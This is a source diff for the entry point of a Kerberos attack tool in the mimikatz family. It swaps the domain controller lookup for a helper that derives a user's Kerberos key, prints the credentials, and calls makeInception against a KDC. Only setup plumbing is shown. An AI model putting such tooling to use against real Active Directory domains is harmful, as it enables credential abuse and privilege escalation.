@@ -35,10 +35,8 @@ BOOL term()
 int main(int argc, char * argv[])
 {
 	EncryptionKey userKey;
-	LPCSTR szUser, szDomain, szPassword = NULL, szKey = NULL, szWhatDC, szNew;
-	DWORD ret;
-	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
-	PDS_DOMAIN_CONTROLLER_INFO_1 dcInfos = NULL;
+	LPCSTR szUser, szDomain, szPassword = NULL, szKey = NULL, szNew;
+	LPSTR szWhatDC;
 	
 	kprintf("\n"
 		"  .#####.   " MIMIKATZ_FULL "\n"
@@ -66,26 +64,20 @@ int main(int argc, char * argv[])
 					{
 						if(NT_SUCCESS(kull_m_kerberos_asn1_helper_util_stringToKey(szUser, szDomain, szPassword, szKey, &userKey)))
 						{
-							ret = DsGetDcName(NULL, szDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
-							if(ret == ERROR_SUCCESS)
+							if(kull_m_kerberos_helper_net_getDC(szDomain, DS_KDC_REQUIRED, &szWhatDC))
 							{
-								szWhatDC = cInfo->DomainControllerName + 2;
-								kprintf("[KDC] \'%s\' will be the main server\n", szWhatDC);
-
-								kprintf("\n"
+								kprintf("[KDC] \'%s\' will be the main server\n\n"
 									"user     : %s\n"
 									"domain   : %s\n"
 									"password : %s\n"
 									"key      : "
-									, szUser, szDomain, szKey ? "<NULL>" : "***");
+									, szWhatDC, szUser, szDomain, szKey ? "<NULL>" : "***");
 								kull_m_string_printf_hex(userKey.keyvalue.value, userKey.keyvalue.length, 0);
 								kprintf(" (%s)\n", kull_m_kerberos_asn1_helper_util_etypeToString(userKey.keytype));
 
 								makeInception(szUser, szDomain, szNew, &userKey, szWhatDC, 88, 464);
-
-								NetApiBufferFree(cInfo);
+								LocalFree(szWhatDC);
 							}
-							else PRINT_ERROR("[KDC] DsGetDcName: %u\n", ret);
 							LocalFree(userKey.keyvalue.value);
 						}
 					}
